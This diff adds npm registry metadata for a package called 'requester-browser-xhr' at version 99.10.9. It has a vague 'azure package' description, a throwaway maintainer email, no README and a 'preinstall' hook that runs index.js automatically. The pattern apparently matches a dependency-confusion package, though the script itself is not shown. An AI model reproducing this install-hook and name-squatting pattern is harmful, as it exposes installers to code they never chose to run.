@@ -1,0 +1,62 @@
+{
+    "_id": "requester-browser-xhr",
+    "name": "requester-browser-xhr",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "requester-browser-xhr",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "requester-browser-xhr@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-HZwnJetjOfdeeavyOuCue9Jsq9j3HjiCJs2GZaYmWcTRmHVMKEsnCHZvJZhlrPMWtSTXf/TOXvE4UXhvj4yG0g==",
+                "shasum": "fc113519e2f908bf8bf9b99557aa8c4e0241cd96",
+                "tarball": "https://registry.npmjs.org/requester-browser-xhr/-/requester-browser-xhr-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5073,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiO7O4ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmrvqw/+Ob0OphUbQjzFWmQLFUUKUMB7HNKNipAALJDRIZcZQGVH+oQ1\r\nzX4j/MSxFVdfbLxqoysPC7X5VY/vF4VR3tNNNYyxV8/5NL9XTH9x0LFfNwMq\r\nT9lpEpbay3Va0mX5Kx0JUPvKvB9+Etk8CA3FlYxZgJUSM9Yi44mz9sxotnKB\r\nck6k0MC1Da/qB3zlKSVKXQyxOwBWX1DzkRqQEBwyKpYYZvFRvkzAI13cbTJT\r\nYidzJcvqm5FCLp5hiMwwKkOkCTe/1gD+eTZOVGQHimh4l5ozx2b8TU9NXodQ\r\nek8Arl7X1wb+XMJp4YMcXIuNf3E5fZb/Q500MeMVZVbdAAOe0bXowl/qRBg5\r\ne59dPzfkllb2jOHJQJZniDsVgADumnA4tCPFFhFQZH5g325s1GXytBktigHG\r\nyFnoE215BR8ljqagZa18+PlvSrVMaqiYKuy8pZBZJIcp4vv/PPq7rnhcH2ZN\r\n+bY//1OO6ACvXPbzwPewtM5TW0ucmiGXI8StKW42ErYbzyZPxjJnkvCQJ417\r\nXQyTOeGpmd5oAhIQ6T3/sUTXgzQ72X+kQIDwWqEydz844PyoGxdZHX+ISKFj\r\n7797ntpZfU6JaZq6GBId+og0Z2NhmiCi5Ejmeo0YgI9SEuD4Gj6P0IeQO6re\r\nH0XsK48E+m/7i4ZtEBafwcT32o7jixdqg2A=\r\n=VIFt\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "iojfazi8",
+                "email": "iojfazi8@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "iojfazi8",
+                    "email": "iojfazi8@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/requester-browser-xhr_99.10.9_1648079800019_0.8072802062633202"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T23:56:40.019Z",
+        "99.10.9": "2022-03-23T23:56:40.168Z",
+        "modified": "2022-03-23T23:56:40.295Z"
+    },
+    "maintainers": [
+        {
+            "name": "iojfazi8",
+            "email": "iojfazi8@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
